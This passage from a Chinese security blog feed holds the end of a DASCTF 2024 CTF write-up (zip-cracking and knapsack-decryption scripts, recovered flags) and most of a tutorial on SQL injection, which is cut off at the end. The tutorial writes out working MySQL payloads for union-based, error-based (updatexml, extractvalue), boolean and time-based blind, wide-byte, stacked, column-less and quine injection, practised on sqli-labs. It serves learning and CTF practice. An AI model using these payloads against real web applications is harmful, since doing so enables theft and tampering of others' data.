src="/../../images/DASCTF/2024%E5%A4%8F/3.png" alt="3"></p><p>得到<strong>a19131f86216}</strong></p><p>最后的flag是<strong>DASCTF{2fd9e9ff-e27d-5405-c5f5-a19131f86216}</strong></p><h2 id="EZ-zip"><a href="#EZ-zip" class="headerlink" title="EZ_zip"></a>EZ_zip</h2><p>跟着复现一遍吧，感觉是提示点。</p><p><img src="/../../images/DASCTF/2024%E5%A4%8F/c.png" alt="c"></p><p>zip文件损坏的问题</p><p>使用010对两个地方进行修改，再进行解压</p><p><img src="/../../images/DASCTF/2024%E5%A4%8F/a.png" alt="a"></p><p><img src="/../../images/DASCTF/2024%E5%A4%8F/b.png" alt="b"></p><p>后面就不明白了，直接引用套神的吧</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python">![解密](../../images/DASCTF/<span class="hljs-number">2024</span>夏/解密.png)<span class="hljs-keyword">import</span> pyzipper<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">crack_zip</span>(<span class="hljs-params">zip_file_path</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        password = <span class="hljs-built_in">bytes</span>([i])<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">with</span> pyzipper.AESZipFile(zip_file_path, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> zip_ref:<br>                zip_ref.extractall(pwd=password)<br>                extracted_files = zip_ref.namelist()<br>                <span class="hljs-keyword">if</span> extracted_files:<br>                    <span class="hljs-keyword">return</span> password, extracted_files[<span class="hljs-number">0</span>]<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    current_zip = <span class="hljs-string">&#x27;320.zip&#x27;</span><br>    all_passwords = <span class="hljs-string">&#x27;&#x27;</span><br><br>    <span class="hljs-keyword">while</span> current_zip:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;Cracking <span class="hljs-subst">&#123;current_zip&#125;</span>...&#x27;</span>)<br>        password, next_zip = crack_zip(current_zip)<br>        <span class="hljs-keyword">if</span> password:<br>            all_passwords += password.<span class="hljs-built_in">hex</span>()<br>            current_zip = next_zip<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;Failed to crack <span class="hljs-subst">&#123;current_zip&#125;</span>&#x27;</span>)<br>            <span class="hljs-keyword">break</span><br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;All passwords: <span class="hljs-subst">&#123;all_passwords&#125;</span>&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br><br></code></pre></td></tr></table></figure><p>得到密码</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">1bb99580c613a87c54e12480aa7ff8c798f71ad280f6ba69d4a4425225e4ec611bb99580c613a87c54e12480aa7ff8c798f71ad280f6ba69d4a4425225e4ec611bb99580c613a87c54e12480aa7ff8c798f71ad280f6ba69d4a4425225e4ec611bb99580c613a87c54e12480aa7ff8c798f71ad280f6ba69d4a4425225e4ec611bb99580c613a87c54e12480aa7ff8c798f71ad280f6ba69d4a4425225e4ec611bb99580c613a87c54e12480aa7ff8c798f71ad280f6ba69d4a4425225e4ec611bb99580c613a87c54e12480aa7ff8c798f71ad280f6ba69d4a4425225e4ec611bb99580c613a87c54e12480aa7ff8c798f71ad280f6ba69d4a4425225e4ec611bb99580c613a87c54e12480aa7ff8c798f71ad280f6ba69d4a4425225e4ec611bb99580c613a87c54e12480aa7ff8c798f71ad280f6ba69d4a4425225e4ec6<br></code></pre></td></tr></table></figure><p>并且得到一个AES-ECB.txt</p><p>明显观察到这个密码是重复的<code>11bb99580c613a87c54e12480aa7ff8c798f71ad280f6ba69d4a4425225e4ec6</code></p><p>然后得到AES的内容是<code>64ZpNmbv2Hg4Jj9bH8Kv6D3OBliD9hgyI3vZWfMDJs2TcEwVnBmH/zkBtPBE3g8e the key may be on your journey？</code></p><p>尝试用这个密码当aes的密码不对，猜测是解压顺序是从320–&gt;1，而密码顺序是1–&gt;320，因此需要反过来</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">c64e5e2225444a9da66b0f28ad718f798cffa70a48124ec5873a610c5899bb11<br></code></pre></td></tr></table></figure><p><img src="/../../images/DASCTF/2024%E5%A4%8F/%E8%A7%A3%E5%AF%86.png" alt="解密"></p><p><strong>DASCTF{514755c6-8280-463c-8378-a29702fc88df}</strong></p><h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h1><h2 id="DosSnake"><a href="#DosSnake" class="headerlink" title="DosSnake"></a>DosSnake</h2><p>ida打开，定位到dasctf</p><p>这段部分的内容与dasctf进行xor得到flag</p><p><img src="/../../images/DASCTF/2024%E5%A4%8F/re.png" alt="re"></p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="complex-enc"><a href="#complex-enc" class="headerlink" title="complex_enc"></a>complex_enc</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">cipher, key</span>):<br>    decrypted_bits = [<span class="hljs-number">0</span>] * <span class="hljs-built_in">len</span>(key)  <span class="hljs-comment"># 初始化为与密钥相同长度的比特流</span><br><br>    <span class="hljs-comment"># 逆序遍历密钥，逐步恢复比特流</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(key) - <span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">if</span> cipher &gt;= key[i]:<br>            cipher -= key[i]<br>            decrypted_bits[i] = <span class="hljs-number">1</span><br><br>    <span class="hljs-keyword">return</span> decrypted_bits<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">bits_to_bytes</span>(<span class="hljs-params">bits</span>):<br>    byte_array = <span class="hljs-built_in">bytearray</span>()<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(bits), <span class="hljs-number">8</span>):<br>        byte = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">for</span> bit <span class="hljs-keyword">in</span> bits[i:i+<span class="hljs-number">8</span>]:<br>            byte = (byte &lt;&lt; <span class="hljs-number">1</span>) | bit<br>        byte_array.append(byte)<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(byte_array)<br><br><span class="hljs-comment"># 手动输入密文和密钥</span><br>cipher = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入密文 (c): &quot;</span>))<br>key_input = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入密钥 (key): &quot;</span>)<br>key = <span class="hljs-built_in">eval</span>(key_input)<br><br><span class="hljs-comment"># 解密密文</span><br>decrypted_bits = decrypt(cipher, key)<br>decrypted_bytes = bits_to_bytes(decrypted_bits)<br><br><span class="hljs-comment"># 打印解密后的内容</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Decrypted bytes (hex):&quot;</span>, decrypted_bytes.<span class="hljs-built_in">hex</span>())<br><span class="hljs-keyword">try</span>:<br>    flag = decrypted_bytes.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Decrypted flag (decoded):&quot;</span>, flag)<br><span class="hljs-keyword">except</span> UnicodeDecodeError:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Decrypted flag contains non-UTF-8 bytes.&quot;</span>)<br></code></pre></td></tr></table></figure><p>背包密码</p>]]></content>
    
    
    <categories>
      
      <category>Misc</category>
      
    </categories>
    
    
    <tags>
      
      <tag>png</tag>
      
      <tag>zip</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sql注入总结</title>
    <link href="/2024/07/16/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/sql%E6%B3%A8%E5%85%A5/"/>
    <url>/2024/07/16/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/sql%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<p>前言:系统的再复习总结一次sql注入，最近比赛比较少见了，但还是要学会的。</p><h2 id="一、sql注入的概念"><a href="#一、sql注入的概念" class="headerlink" title="一、sql注入的概念"></a>一、sql注入的概念</h2><p>SQL注入（SQL Injection）是一种网络攻击技术，攻击者通过在输入字段中插入恶意的SQL代码，利用应用程序对用户输入处理不当的漏洞，诱使其执行未经授权的SQL查询。这种攻击可以导致数据库中的敏感数据泄露、数据篡改或删除，甚至让攻击者获得对整个数据库系统的控制。SQL注入常见于不安全的Web应用程序中，是一种严重的安全威胁，通常需要通过参数化查询、预处理语句和输入验证等方法进行防御。是ctf比赛中常考的题目。</p><h2 id="二、寻找sql注入点"><a href="#二、寻找sql注入点" class="headerlink" title="二、寻找sql注入点"></a>二、寻找sql注入点</h2><p>通常sql注入的题目都有明显的特征，比如填表格，登陆账号这些。</p><p>1.在参数后面添加单引号或双引号，查看返回包，如果报错或者长度变化，可能存在Sql注入</p><p>判断：id&#x3D;1’（常见）id&#x3D;1” id&#x3D;1’) id&#x3D;1’)) id&#x3D;1”) id&#x3D;1”))</p><p>2.通常通过get,post,cookie等请求再到相应的http头信息查找敏感信息</p><p>3.构造不同的语句检测异常</p><h2 id="三、sql注入类型"><a href="#三、sql注入类型" class="headerlink" title="三、sql注入类型"></a>三、sql注入类型</h2><p>常见的主要还是MySQL注入,主要以这个为切入点。</p><p>建议可以搭建一个sql-labs的靶场，网上都有教程，自己检索。</p><h3 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h3><h4 id="类型判断"><a href="#类型判断" class="headerlink" title="类型判断"></a>类型判断</h4><p>数字型:<code>select * from table where id =$id</code></p><p>字符型:<code>select * from table where id=&#39;$id&#39;</code></p><p>判断的时候通常通过永真式和永假式进行判断</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs markdown">1 and 1=1 #永真式   select * from table where id=1 and 1=1<br>1 and 1=2 #永假式   select * from table where id=1 and 1=2<br><span class="hljs-section">#若永假式运行错误，则说明此SQL注入为数字型注入</span><br></code></pre></td></tr></table></figure><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs markdown">1&#x27; and &#x27;1&#x27;=&#x27;1<br>1&#x27; and &#x27;1&#x27;=&#x27;2<br><span class="hljs-section">#若永假式运行错误，则说明此SQL注入为字符型注入</span><br></code></pre></td></tr></table></figure><h4 id="字段个数"><a href="#字段个数" class="headerlink" title="字段个数"></a>字段个数</h4><p>通常用<code>order by</code>查询字段的个数</p><p>挨个查通常就能查到临界值</p><p>用sql-labs第一题来测试一下，尝试</p><p><img src="/../../images/%E6%96%87%E7%AB%A0/sql%E6%B3%A8%E5%85%A5/%E5%AD%97%E6%AE%B5%E4%B8%AA%E6%95%B0.png" alt="字段个数"></p><p><img src="/../../images/%E6%96%87%E7%AB%A0/sql%E6%B3%A8%E5%85%A5/%E5%AD%97%E6%AE%B5%E4%B8%AA%E6%95%B01.png" alt="字段个数1"></p><p>如图可以判断出3是临界值</p><h4 id="查找显示位"><a href="#查找显示位" class="headerlink" title="查找显示位"></a>查找显示位</h4><p>使用<code>union select</code>查找显示位，需要判断具体个数在前端显示，通常将前面的改成0或-1,这里的目的是使第一个查询不存在，显示第二个查询结果，通过显示得出显示位</p><p><img src="/../../images/%E6%96%87%E7%AB%A0/sql%E6%B3%A8%E5%85%A5/%E6%98%BE%E7%A4%BA%E4%BD%8D.png" alt="显示位"></p><h4 id="爆库名"><a href="#爆库名" class="headerlink" title="爆库名"></a>爆库名</h4><p>使用database(),返回当前的库名</p><p><img src="/../../images/%E6%96%87%E7%AB%A0/sql%E6%B3%A8%E5%85%A5/%E7%88%86%E5%BA%93.png" alt="爆库"></p><h4 id="爆表名"><a href="#爆表名" class="headerlink" title="爆表名"></a>爆表名</h4><p>基于已知的库名进行爆表，主要有以下函数</p><p><code>group_concat()</code>:使数据能在一行输出</p><p><code>information_schema.tables</code>:存储了数据表的元数据信息使用<code>table_name</code>和<code>table_schema</code>字段</p><p><img src="/../../images/%E6%96%87%E7%AB%A0/sql%E6%B3%A8%E5%85%A5/%E7%88%86%E8%A1%A8.png" alt="爆表"></p><h4 id="爆列名"><a href="#爆列名" class="headerlink" title="爆列名"></a>爆列名</h4><p>基于表名的基础上，进一步爆列名</p><p>与上文类似，用information_schema.columns和column_name来</p><p><img src="/../../images/%E6%96%87%E7%AB%A0/sql%E6%B3%A8%E5%85%A5/%E7%88%86%E5%88%97.png" alt="爆列"></p><h4 id="爆信息"><a href="#爆信息" class="headerlink" title="爆信息"></a>爆信息</h4><p>基于已知的列名爆出信息</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">?id=-1&#x27;union select 1,group<span class="hljs-emphasis">_concat(email_</span>id),3 from emails%23<br></code></pre></td></tr></table></figure><p>想获得所有列对应的信息的可以使用<code>concat_ws</code></p><p><img src="/../../images/%E6%96%87%E7%AB%A0/sql%E6%B3%A8%E5%85%A5/%E7%88%86%E4%BF%A1%E6%81%AF.png" alt="爆信息"></p><h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>本质使用函数报错，通过报错获得想要的数据，前提是后端没有屏蔽信息。</p><h4 id="Xpath导致的报错"><a href="#Xpath导致的报错" class="headerlink" title="Xpath导致的报错"></a>Xpath导致的报错</h4><p>归类为 XPath 格式不正确或缺失导致报错</p><h5 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h5><p>是改变 XML 文档中符合条件的值，其语法如下</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">updatexml(XML<span class="hljs-emphasis">_document,XPath_</span>string,new<span class="hljs-emphasis">_value)</span><br></code></pre></td></tr></table></figure><p>直接使用有缺陷会进行报错，<code>XPATH syntax error: &#39;~&#39;</code></p><p>可以结合concat配合使用，如</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">and updatexml(1,concat(0x7e,(database()),0x7e),1)<br></code></pre></td></tr></table></figure><p><img src="/../../images/%E6%96%87%E7%AB%A0/sql%E6%B3%A8%E5%85%A5/%E6%8A%A5%E9%94%99.png" alt="报错"></p><p>接着按上面的流程来爆表</p><p>值得注意的是该函数报错长度存在字符长度限制，所以需要limit限制读行如图所示</p><p><img src="/../../images/%E6%96%87%E7%AB%A0/sql%E6%B3%A8%E5%85%A5/%E6%8A%A5%E9%94%99-1.png" alt="报错-1"></p><p>除了limit限制之外，也可以使用substr(xxxxxx,1,30)这样的形式获得</p><h5 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h5><p>用于从 XML 格式的数据中提取指定节点的值。用法</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">extractvalue(XML<span class="hljs-emphasis">_document,xpath_</span>string)<br></code></pre></td></tr></table></figure><p>语法基本和updatexml差不多，只是少一位，如图显示</p><p><img src="/../../images/%E6%96%87%E7%AB%A0/sql%E6%B3%A8%E5%85%A5/%E6%8A%A5%E9%94%99-2.png" alt="报错-2"></p><p>注意这里的报错限制和updatexml也是一致的</p><h4 id="主键重复导致的报错"><a href="#主键重复导致的报错" class="headerlink" title="主键重复导致的报错"></a>主键重复导致的报错</h4><p>主键报错注入是由于<code>rand()</code>，<code>count()</code> ，<code>floor()</code>三个函数和一个<code>group by</code>语句联合使用造成的，缺一不可</p><p><code>rand()</code>函数的基础语法是这样的，它的参数被叫做 seed(种子)，当种子为空的时候，<code>rand()</code>函数会返回一个<code>[0,1)</code>范围内的随机数，当种子为一个数值时，则会返回一个可复现的随机数序列</p><p><code>floor()</code>函数的作用就是返回小于等于括号内该值的最大整数，也就是取整，它这里的取整不是进行四舍五入，而是直接留下整数位，去掉小数位，如果是负数则整数位需要加一，也就是<strong>去一法</strong></p><p><code>count()</code>得到行数</p><p><code>group by</code> 列名</p><h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><h4 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h4><p>在页面没有错误回显时完成的注入攻击。此时我们输入的语句让页面呈现出两种状态，相当于true和false，根据这两种状态可以判断我们输入的语句是否查询成功。</p><p>以sqli-labs举例当输入正确的时候只会回显一句话，输入错误的时候就没有回显。</p><h5 id="判断数据库类型"><a href="#判断数据库类型" class="headerlink" title="判断数据库类型"></a>判断数据库类型</h5><p>使用exists()函数，通过语句判断是哪种类型</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs markdown">//判断是否是 Mysql数据库<br> exists(select<span class="hljs-emphasis">*from information_schema.tables) --+</span><br><span class="hljs-emphasis">//判断是否是 access数据库</span><br><span class="hljs-emphasis"> exists(select*</span>from msysobjects) --+<br>//判断是否是 Sqlserver数据库<br> exists(select<span class="hljs-emphasis">*from sysobjects) --+</span><br></code></pre></td></tr></table></figure><h5 id="判断数据库名"><a href="#判断数据库名" class="headerlink" title="判断数据库名"></a>判断数据库名</h5><p>先通过<code>length()函数</code>和二分法判断出数据库的长度</p><p><img src="/../../images/%E6%96%87%E7%AB%A0/sql%E6%B3%A8%E5%85%A5/bool.png" alt="bool"></p><p>通过调整判断得到database的长度，然后进行尝试字母</p><p>可以直接使用判断</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">substr(database(),1,1)=&#x27;s&#x27;<br></code></pre></td></tr></table></figure><p>也可以结合ascii()来判断</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">ascii(substr(database(),1,1))=115<br></code></pre></td></tr></table></figure><h5 id="判断表字段"><a href="#判断表字段" class="headerlink" title="判断表字段"></a>判断表字段</h5><p>exists(select id from emails)–+可以直接懵看看</p><p>判断表的个数</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">(select count(table<span class="hljs-emphasis">_name) from information_</span>schema.tables where table<span class="hljs-emphasis">_schema=&#x27;security&#x27;)=4 --+</span><br></code></pre></td></tr></table></figure><p>判断表的长度</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">length((select table<span class="hljs-emphasis">_name from information_</span>schema.tables where table<span class="hljs-emphasis">_schema=database() limit 0,1))=6--+</span><br></code></pre></td></tr></table></figure><p>判断表的内容</p><p>这个是直接判断</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">substr((select table<span class="hljs-emphasis">_name from information_</span>schema.tables where table<span class="hljs-emphasis">_schema=database() limit 0,1),1,1)=&#x27;e&#x27; --+</span><br></code></pre></td></tr></table></figure><p>用ascii来判断</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">ascii(substr((select table<span class="hljs-emphasis">_name from information_</span>schema.tables where table<span class="hljs-emphasis">_schema=database() limit 0,1),1,1))&gt;100 --+</span><br></code></pre></td></tr></table></figure><h5 id="判断字段数据"><a href="#判断字段数据" class="headerlink" title="判断字段数据"></a>判断字段数据</h5><p>先判断长度</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">length((select email<span class="hljs-emphasis">_id from emails limit 0,1))&gt;2--+</span><br></code></pre></td></tr></table></figure><p>再判断内容</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">ascii(substr((select email<span class="hljs-emphasis">_id from emails limit 0,1),2,1))&gt;100 %23</span><br></code></pre></td></tr></table></figure><p><strong>通常布尔还是sqlmap来吧手注太累了</strong></p><h4 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h4><p>通过观察页面，既没有回显数据库内容，又没有报错信息也没有布尔类型状态，那么我们可以考虑用延时注入。延时注入就是将页面的时间线作为判断依据，一点一点注入出数据库的信息。</p><h5 id="判断库名"><a href="#判断库名" class="headerlink" title="判断库名"></a>判断库名</h5><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">and if(ascii(substr(database(),1,1))= 115,sleep(5),0) --+<br></code></pre></td></tr></table></figure><p>if(expr1,expr2,expr3)    如果expr1的值为true，则返回expr2的值，如果expr1的值为false，则返回expr3的值。</p><p>基本流程与布尔盲注类似</p><h3 id="HTTP注入"><a href="#HTTP注入" class="headerlink" title="HTTP注入"></a>HTTP注入</h3><p>流程基本相似，主要再UA头，cookie，Referer和xff这几种情况来看。</p><p>利用报错注入得到答案</p><h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><p>国内最常使用的 GBK 编码，这种方式主要是绕过 <code>addslashes</code> 等对特殊字符进行转移的绕过。反斜杠 <code>\</code> 的十六进制为 <code>%5c</code>，在你输入 <code>%bf%27</code> 时，函数遇到单引号自动转移加入 <code>\</code>，此时变为 <code>%bf%5c%27</code>，<code>%bf%5c</code> 在 GBK 中变为一个宽字符「縗」。<code>%bf</code> 那个位置可以是 <code>%81-%fe</code> 中间的任何字符。不止在 SQL 注入中，宽字符注入在很多地方都可以应用。</p><h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><p>分号（;）是用来表示一条sql语句的结束。在 ; 结束一个sql语句后继续构造下一条语句，会另外执行。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。<br><img src="/../../images/%E6%96%87%E7%AB%A0/sql%E6%B3%A8%E5%85%A5/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5.png" alt="堆叠注入"></p><p>图中继续执行了更新id为1 的用户的密码信息</p><p>缺点：并不是每一个环境都适合堆叠注入，且在堆叠前还需要知道一些信息才能正常注入。</p><h3 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a>无列名注入</h3><p>参考：<a href="https://err0r.top/article/mardasctf/">文章</a></p><p>简单的讲以下核心的内容</p><p>正常在order by 之后知道字段个数后</p><p>比如使用查询，这里的默认是table</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">select 1,2,3 union select * from table;<br></code></pre></td></tr></table></figure><p>接下来这个语句</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">select <span class="hljs-code">`2`</span> from (select 1,2,3,4,5 union select * from table)a;<br></code></pre></td></tr></table></figure><p>这样的查询，可以得到一个派生的表，这里的a是派生的表的别称</p><p>这里前面的2是引用的2的列，成了一个新的表</p><p>如果过滤了反引号</p><p>可以继续用别名代替，比如</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">select c from (select 1,2 as b,3,4 as c,5 as d union select * from table)a;<br></code></pre></td></tr></table></figure><p>这里就是调用表里面的4的列。</p><p>再次基础上可以进行多表查询</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">select concat(b,0x2d,c) from (select 1,2 as b,3 as c,4,5 union select * from table)a;<br></code></pre></td></tr></table></figure><p>这边的0x2d是<code>-</code>,这里的派生表2，3的表生成新的表。</p><p>这里利用join函数可以进行无column的查询</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">concat(0x7e,(select <span class="hljs-emphasis">*from (select *</span>from output a join output b)c))<br></code></pre></td></tr></table></figure><p>因为是同一个表，构成的新表就会得到所有的列的信息，从而进行绕过。</p><p>例题参照<a href="https://www.nssctf.cn/problem/2034">[NISACTF 2022]join-us</a></p><h3 id="Quine注入"><a href="#Quine注入" class="headerlink" title="Quine注入"></a>Quine注入</h3><p><a href="https://blog.csdn.net/qq_35782055/article/details/130348274?spm=1001.2101.3001.6650.3&utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~Rate-3-130348274-blog-125531088.235%5Ev43%5Epc_blog_bottom_relevance_base2&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~Rate-3-130348274-blog-125531088.235%5Ev43%5Epc_blog_bottom_relevance_base2&utm_relevant_index=6">参考文章</a>，也是刷题偶观，记录一下</p><p>quine注入即查询的结果是查询的语句，举个简单的例子</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">select replace(&quot;.&quot;,char(46),&quot;.&quot;);<br></code></pre></td></tr></table></figure><p>匹配字符串”.“中ascii码为46的字符并替换为”.“,也就是将”.“转换为”.”并返回</p><p>在实际替换中，单引号会变成双引号，可以引入char(34)和char(39)进行替换，比如</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">select replace(&quot;\&quot;\&quot;&quot;,char(34),char(39));<br></code></pre></td></tr></table></figure><p>这里面是连续两个双引号用斜杠进行正常的输入，通过匹配会输出’’</p><p>所以替换的就变成了</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;<br></code></pre></td></tr></table></figure><p>这一步就是替换单双引号</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">select replace(&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;,char(34),char(39));<br></code></pre></td></tr></table></figure><p>然后替换为相关字符</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">select replace(replace(&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;,char(34),char(39)),char(46),&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;);<br></code></pre></td></tr></table></figure><p>最后直接来个脚本吧，没太深入的明白，看看先能写题就行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 